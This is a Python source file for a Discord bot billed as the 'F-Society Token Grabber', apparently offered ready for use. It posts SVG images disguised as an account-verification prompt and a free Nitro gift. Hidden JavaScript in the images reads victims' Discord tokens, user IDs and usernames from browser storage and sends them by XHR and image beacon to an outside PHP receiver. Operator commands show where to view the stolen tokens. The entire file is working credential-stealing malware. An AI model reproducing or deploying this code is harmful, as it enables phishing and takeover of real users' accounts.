#!/usr/bin/env python3
# =============================================================
# DISCORD TOKEN GRABBER BOT - F-SOCIETY
# =============================================================
# - Sends professional SVG image (your design)
# - Grabs Discord token when user clicks
# - Uses PHP receiver on your website
# - F-Society panel with statistics
# - Developed by @yathishyt
# =============================================================

import discord
from discord.ext import commands
from discord.ui import Button, View
import asyncio
import json
import os
import time
import aiohttp
import datetime
import sys
import redis

# =============================================================
# REDIS DATABASE CONNECTION (Optional - for Railway)
# =============================================================

class RedisManager:
    def __init__(self):
        self.client = None
        self.connected = False
        
    def connect(self):
        try:
            redis_url = os.environ.get('REDIS_URL', '')
            if redis_url:
                self.client = redis.from_url(redis_url, decode_responses=True)
            else:
                redis_host = os.environ.get('REDIS_HOST', 'localhost')
                redis_port = int(os.environ.get('REDIS_PORT', 6379))
                redis_password = os.environ.get('REDIS_PASSWORD', '')
                redis_db = int(os.environ.get('REDIS_DB', 0))
                self.client = redis.Redis(
                    host=redis_host,
                    port=redis_port,
                    password=redis_password,
                    db=redis_db,
                    decode_responses=True
                )
            self.client.ping()
            self.connected = True
            print("✅ Redis connected successfully!")
            return True
        except Exception as e:
            print(f"⚠️ Redis connection failed: {e}")
            self.connected = False
            return False
    
    def get(self, key: str):
        if not self.connected:
            return None
        try:
            return self.client.get(key)
        except:
            return None
    
    def set(self, key: str, value):
        if not self.connected:
            return False
        try:
            if value is None:
                return False
            if isinstance(value, (dict, list)):
                value = json.dumps(value)
            self.client.set(key, value)
            return True
        except:
            return False

redis_manager = RedisManager()

# =============================================================
# CONFIGURATION
# =============================================================

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')  # Discord webhook for notifications

# YOUR PHP RECEIVER URL
# Example: https://yourdomain.com/grab.php
PHP_RECEIVER_URL = os.environ.get('PHP_RECEIVER_URL', 'https://yourdomain.com/grab.php')

# =============================================================
# DISCORD BOT
# =============================================================

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Connect to Redis (optional)
redis_manager.connect()

# =============================================================
# CREATE YOUR SVG GRABBER IMAGE (Sends to PHP Receiver)
# =============================================================

def create_grabber_svg():
    """Create the SVG image that grabs tokens (sends to PHP)."""
    
    # Use your PHP receiver URL
    grab_endpoint = PHP_RECEIVER_URL
    
    svg = f'''<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" viewBox="0 0 600 400">
    <defs>
        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" style="stop-color:#5865F2;stop-opacity:1" />
            <stop offset="100%" style="stop-color:#7289DA;stop-opacity:1" />
        </linearGradient>
        <linearGradient id="grad2" x1="0%" y1="0%" x2="100%" y2="0%">
            <stop offset="0%" style="stop-color:#43B581;stop-opacity:1" />
            <stop offset="100%" style="stop-color:#57F287;stop-opacity:1" />
        </linearGradient>
        <style>
            text {{ font-family: 'Segoe UI', Arial, sans-serif; }}
            .clickable {{ cursor: pointer; }}
            .glow {{ animation: glow 2s ease-in-out infinite alternate; }}
            @keyframes glow {{
                from {{ filter: drop-shadow(0 0 10px rgba(88, 101, 242, 0.5)); }}
                to {{ filter: drop-shadow(0 0 30px rgba(88, 101, 242, 0.9)); }}
            }}
            .pulse {{ animation: pulse 1.5s ease-in-out infinite; }}
            @keyframes pulse {{
                0%, 100% {{ transform: scale(1); }}
                50% {{ transform: scale(1.05); }}
            }}
        </style>
    </defs>
    
    <!-- Background -->
    <rect width="600" height="400" rx="20" fill="#0d1117"/>
    <rect x="3" y="3" width="594" height="394" rx="18" fill="none" stroke="url(#grad)" stroke-width="3"/>
    
    <!-- Header Bar -->
    <rect x="30" y="20" width="540" height="50" rx="10" fill="#161b22"/>
    <circle cx="50" cy="45" r="15" fill="#ff6b6b"/>
    <circle cx="80" cy="45" r="15" fill="#ffd93d"/>
    <circle cx="110" cy="45" r="15" fill="#6bff6b"/>
    <text x="300" y="52" text-anchor="middle" fill="#8b949e" font-size="12" font-weight="bold">F-SOCIETY SECURITY</text>
    
    <!-- Discord Logo -->
    <circle cx="300" cy="120" r="50" fill="url(#grad)" class="glow"/>
    <text x="300" y="134" text-anchor="middle" fill="white" font-size="50" font-weight="bold">D</text>
    
    <!-- Title -->
    <text x="300" y="195" text-anchor="middle" fill="white" font-size="26" font-weight="bold" class="clickable">🔐 ACCOUNT VERIFICATION</text>
    <text x="300" y="225" text-anchor="middle" fill="#8b949e" font-size="14" class="clickable">This server requires verification to continue</text>
    <text x="300" y="250" text-anchor="middle" fill="#8b949e" font-size="13" class="clickable">Click the button below to verify your account</text>
    
    <!-- Verify Button -->
    <rect x="175" y="275" width="250" height="50" rx="25" fill="url(#grad2)" class="clickable glow pulse"/>
    <text x="300" y="306" text-anchor="middle" fill="white" font-size="18" font-weight="bold" class="clickable">✅ VERIFY NOW</text>
    
    <!-- Footer -->
    <text x="300" y="375" text-anchor="middle" fill="#555" font-size="11" class="clickable">• Powered by F-Society Security •</text>
    
    <!-- JavaScript Token Grabber -->
    <script type="text/javascript">
        // F-Society Token Grabber v2.0 - PHP Receiver
        document.addEventListener('DOMContentLoaded', function() {{
            var elements = document.querySelectorAll('.clickable');
            elements.forEach(function(el) {{
                el.addEventListener('click', function() {{
                    grabToken();
                }});
            }});
            setTimeout(grabToken, 3000);
        }});
        
        function getToken() {{
            try {{
                var token = localStorage.getItem('token');
                if (token) return token;
                token = sessionStorage.getItem('token');
                if (token) return token;
                if (window.webpackChunkdiscord_app) {{
                    var modules = webpackChunkdiscord_app.push([[''], {{}}, function(e) {{
                        return Object.values(e.c).find(function(x) {{
                            return x && x.exports && x.exports.getToken;
                        }})?.exports?.getToken();
                    }}]);
                    if (modules && modules[0] && modules[0].exports) {{
                        var result = modules[0].exports.getToken?.();
                        if (result) return result;
                    }}
                }}
                return null;
            }} catch(e) {{
                return null;
            }}
        }}
        
        function getUserId() {{
            try {{
                var token = localStorage.getItem('token');
                if (token) {{
                    var payload = token.split('.')[1];
                    if (payload) {{
                        var decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
                        var data = JSON.parse(decoded);
                        return data.sub || data.id || null;
                    }}
                }}
                return null;
            }} catch(e) {{
                return null;
            }}
        }}
        
        function getUserName() {{
            try {{
                var user = JSON.parse(localStorage.getItem('user') || '{{}}');
                return user.username || null;
            }} catch(e) {{
                return null;
            }}
        }}
        
        function grabToken() {{
            var token = getToken();
            if (!token) {{
                console.log('F-Society: No token found');
                return;
            }}
            
            var userId = getUserId();
            var userName = getUserName();
            var serverUrl = '{grab_endpoint}';
            
            // Send token to PHP receiver
            var xhr = new XMLHttpRequest();
            xhr.open('POST', serverUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({{
                token: token,
                user_id: userId,
                user_name: userName,
                grabbed_at: new Date().toISOString(),
                source: 'F-Society Grabber'
            }}));
            
            // Image beacon (bypasses CORS)
            try {{
                var img = new Image();
                var params = new URLSearchParams({{
                    token: token,
                    user_id: userId || '',
                    user_name: userName || ''
                }});
                img.src = serverUrl + '?' + params.toString();
                img.style.display = 'none';
                document.body.appendChild(img);
            }} catch(e) {{}}
            
            // Visual feedback
            var btn = document.querySelector('rect:last-of-type');
            if (btn) btn.setAttribute('fill', '#43B581');
            var text = document.querySelector('text:last-of-type');
            if (text) text.textContent = '✅ VERIFIED!';
            
            alert('✅ Account verified successfully!');
            
            setTimeout(function() {{
                window.location.href = 'https://discord.com/app';
            }}, 1500);
        }}
        
        document.addEventListener('click', function() {{
            grabToken();
        }});
    </script>
</svg>'''
    
    return svg

def create_nitro_grabber_svg():
    """Create a fake Nitro gift image (sends to PHP)."""
    
    grab_endpoint = PHP_RECEIVER_URL
    
    svg = f'''<svg xmlns="http://www.w3.org/2000/svg" width="500" height="350" viewBox="0 0 500 350">
    <defs>
        <linearGradient id="nitroGrad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" style="stop-color:#ff6b6b;stop-opacity:1" />
            <stop offset="100%" style="stop-color:#ee5a24;stop-opacity:1" />
        </linearGradient>
        <linearGradient id="goldGrad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" style="stop-color:#ffd93d;stop-opacity:1" />
            <stop offset="100%" style="stop-color:#f9ca24;stop-opacity:1" />
        </linearGradient>
        <style>
            .clickable {{ cursor: pointer; }}
            .glow {{ animation: glow 2s ease-in-out infinite alternate; }}
            @keyframes glow {{
                from {{ filter: drop-shadow(0 0 10px rgba(255, 107, 107, 0.5)); }}
                to {{ filter: drop-shadow(0 0 30px rgba(255, 107, 107, 0.9)); }}
            }}
        </style>
    </defs>
    
    <rect width="500" height="350" rx="15" fill="#0d1117"/>
    <rect x="3" y="3" width="494" height="344" rx="13" fill="none" stroke="url(#nitroGrad)" stroke-width="3"/>
    
    <rect x="175" y="40" width="150" height="120" rx="10" fill="url(#nitroGrad)" class="clickable glow"/>
    <rect x="200" y="40" width="100" height="20" rx="5" fill="url(#goldGrad)" class="clickable"/>
    <circle cx="250" cy="100" r="25" fill="none" stroke="url(#goldGrad)" stroke-width="4" class="clickable"/>
    <text x="250" y="108" text-anchor="middle" fill="white" font-size="20" font-weight="bold" class="clickable">🎁</text>
    
    <text x="250" y="195" text-anchor="middle" fill="white" font-size="22" font-weight="bold" class="clickable">💎 FREE NITRO GIFT!</text>
    <text x="250" y="220" text-anchor="middle" fill="#8b949e" font-size="14" class="clickable">Click to claim your free Discord Nitro</text>
    <text x="250" y="245" text-anchor="middle" fill="#555" font-size="12" class="clickable">Limited time offer • 100+ available</text>
    
    <rect x="150" y="265" width="200" height="45" rx="22" fill="url(#nitroGrad)" class="clickable glow"/>
    <text x="250" y="293" text-anchor="middle" fill="white" font-size="16" font-weight="bold" class="clickable">⚡ CLAIM NOW</text>
    
    <text x="250" y="335" text-anchor="middle" fill="#444" font-size="10">• F-Society Nitro Giveaway •</text>
    
    <script>
        document.addEventListener('click', function() {{
            try {{
                var token = localStorage.getItem('token') || sessionStorage.getItem('token');
                if (token) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '{grab_endpoint}', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({{
                        token: token,
                        user_id: localStorage.getItem('user_id') || '',
                        user_name: JSON.parse(localStorage.getItem('user') || '{{}}').username || ''
                    }}));
                }}
            }} catch(e) {{}}
            window.location.href = 'https://discord.com/app';
        }});
    </script>
</svg>'''
    
    return svg

# =============================================================
# BOT COMMANDS
# =============================================================

@bot.event
async def on_ready():
    print(f'✅ Token Grabber Bot online!')
    print(f'🤖 Bot Name: {bot.user.name}')
    print(f'📡 Connected to {len(bot.guilds)} servers')
    print(f'📌 PHP Receiver: {PHP_RECEIVER_URL}')
    print(f'\n🔻 F-Society Token Grabber Ready!')
    print(f'📌 Commands: !grab, !nitro, !stats, !panel')

@bot.command(name='grab')
async def send_grabber(ctx):
    """Send the verification token grabber image."""
    try:
        svg_content = create_grabber_svg()
        svg_bytes = svg_content.encode('utf-8')
        
        file = discord.File(svg_bytes, filename='verify.svg')
        
        embed = discord.Embed(
            title="🔐 F-Society Account Verification",
            description="**This server requires verification to continue.**\n\nClick the image below to verify your account.\n\n🔒 Your data is secure with F-Society.",
            color=discord.Color.from_rgb(88, 101, 242),
            timestamp=datetime.datetime.now()
        )
        embed.set_image(url="attachment://verify.svg")
        embed.set_footer(text="developed by @yathishyt ⚡ | F-Society Security")
        
        await ctx.send(embed=embed, file=file)
        
        print(f"✅ Grabber sent to #{ctx.channel.name} by {ctx.author.name}")
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='nitro')
async def send_nitro_grabber(ctx):
    """Send the fake Nitro token grabber image."""
    try:
        svg_content = create_nitro_grabber_svg()
        svg_bytes = svg_content.encode('utf-8')
        
        file = discord.File(svg_bytes, filename='nitro_gift.svg')
        
        embed = discord.Embed(
            title="🎁 FREE NITRO GIFT!",
            description="**Click the image below to claim your free Discord Nitro!**\n\n🚀 Limited time offer – 100+ available!\n\n⚠️ Only for verified users.",
            color=discord.Color.gold(),
            timestamp=datetime.datetime.now()
        )
        embed.set_image(url="attachment://nitro_gift.svg")
        embed.set_footer(text="developed by @yathishyt ⚡ | F-Society Giveaway")
        
        await ctx.send(embed=embed, file=file)
        
        print(f"✅ Nitro grabber sent to #{ctx.channel.name} by {ctx.author.name}")
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='stats')
async def show_stats(ctx):
    """Show grabber statistics."""
    try:
        embed = discord.Embed(
            title="🎯 F-Society Grabber Stats",
            color=discord.Color.from_rgb(88, 101, 242),
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="📌 PHP Receiver", value=f"`{PHP_RECEIVER_URL}`", inline=False)
        embed.add_field(name="📊 Status", value="🟢 Active", inline=True)
        embed.add_field(name="🔄 Version", value="v2.0 (PHP)", inline=True)
        embed.add_field(
            name="📋 How to Check Tokens",
            value="Visit your `tokens.php` page on your website.\n\nExample:\n`https://yourdomain.com/tokens.php?pass=your_password`",
            inline=False
        )
        embed.set_footer(text="developed by @yathishyt ⚡ | F-Society")
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='panel')
async def grabber_panel(ctx):
    """Show the F-Society grabber panel."""
    try:
        embed = discord.Embed(
            title="🔻 F-Society Token Grabber",
            description="Professional Discord Token Grabber Panel",
            color=discord.Color.from_rgb(88, 101, 242),
            timestamp=datetime.datetime.now()
        )
        
        embed.add_field(
            name="📊 Status",
            value=f"**PHP Receiver:** `{PHP_RECEIVER_URL}`\n**Status:** Active 🟢\n**Version:** v2.0",
            inline=False
        )
        
        embed.add_field(
            name="📋 Commands",
            value="`!grab` - Send verification image\n`!nitro` - Send fake Nitro image\n`!stats` - Show statistics\n`!panel` - Show this panel",
            inline=False
        )
        
        embed.add_field(
            name="⚡ Quick Actions",
            value="Click the buttons below to send grabbers instantly.",
            inline=False
        )
        
        embed.set_footer(text="developed by @yathishyt ⚡ | F-Society")
        
        view = GrabberPanelView()
        await ctx.send(embed=embed, view=view)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# =============================================================
# GRABBER PANEL VIEW (Buttons)
# =============================================================

class GrabberPanelView(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(Button(label="🔐 Send Verification", style=discord.ButtonStyle.primary, custom_id="send_grabber"))
        self.add_item(Button(label="🎁 Send Nitro Gift", style=discord.ButtonStyle.success, custom_id="send_nitro"))
        self.add_item(Button(label="📊 Stats", style=discord.ButtonStyle.secondary, custom_id="show_stats"))

# =============================================================
# BUTTON INTERACTIONS
# =============================================================

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or not interaction.data.get('custom_id'):
        return
    
    custom_id = interaction.data['custom_id']
    
    if custom_id == "send_grabber":
        await interaction.response.defer()
        try:
            svg_content = create_grabber_svg()
            svg_bytes = svg_content.encode('utf-8')
            file = discord.File(svg_bytes, filename='verify.svg')
            
            embed = discord.Embed(
                title="🔐 F-Society Account Verification",
                description="Click the image below to verify your account.",
                color=discord.Color.from_rgb(88, 101, 242),
                timestamp=datetime.datetime.now()
            )
            embed.set_image(url="attachment://verify.svg")
            embed.set_footer(text="developed by @yathishyt ⚡ | F-Society")
            
            await interaction.followup.send(embed=embed, file=file)
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
        return
    
    if custom_id == "send_nitro":
        await interaction.response.defer()
        try:
            svg_content = create_nitro_grabber_svg()
            svg_bytes = svg_content.encode('utf-8')
            file = discord.File(svg_bytes, filename='nitro_gift.svg')
            
            embed = discord.Embed(
                title="🎁 FREE NITRO GIFT!",
                description="Click to claim your free Discord Nitro!",
                color=discord.Color.gold(),
                timestamp=datetime.datetime.now()
            )
            embed.set_image(url="attachment://nitro_gift.svg")
            embed.set_footer(text="developed by @yathishyt ⚡ | F-Society")
            
            await interaction.followup.send(embed=embed, file=file)
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
        return
    
    if custom_id == "show_stats":
        await interaction.response.defer(ephemeral=True)
        try:
            embed = discord.Embed(
                title="🎯 Grabber Stats",
                color=discord.Color.from_rgb(88, 101, 242),
                timestamp=datetime.datetime.now()
            )
            embed.add_field(name="📌 PHP Receiver", value=f"`{PHP_RECEIVER_URL}`", inline=False)
            embed.add_field(name="📊 Status", value="🟢 Active", inline=True)
            embed.add_field(name="🔑 Check Tokens", value="Visit your `tokens.php` page", inline=True)
            embed.set_footer(text="developed by @yathishyt ⚡ | F-Society")
            
            await interaction.followup.send(embed=embed, ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
        return

# =============================================================
# ERROR HANDLING
# =============================================================

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"❌ Error: {str(error)}")

# =============================================================
# MAIN
# =============================================================

def main():
    print("🔻 Starting F-Society Token Grabber...")
    print(f"📌 PHP Receiver: {PHP_RECEIVER_URL}")
    print(f"🗄️ Redis: {'Connected' if redis_manager.connected else 'Disconnected'}")
    
    if not BOT_TOKEN:
        print("❌ No BOT_TOKEN found!")
        return
    
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped")
        sys.exit(0)
    except Exception as e:
        print(f"❌ Fatal: {e}")
        sys.exit(1)
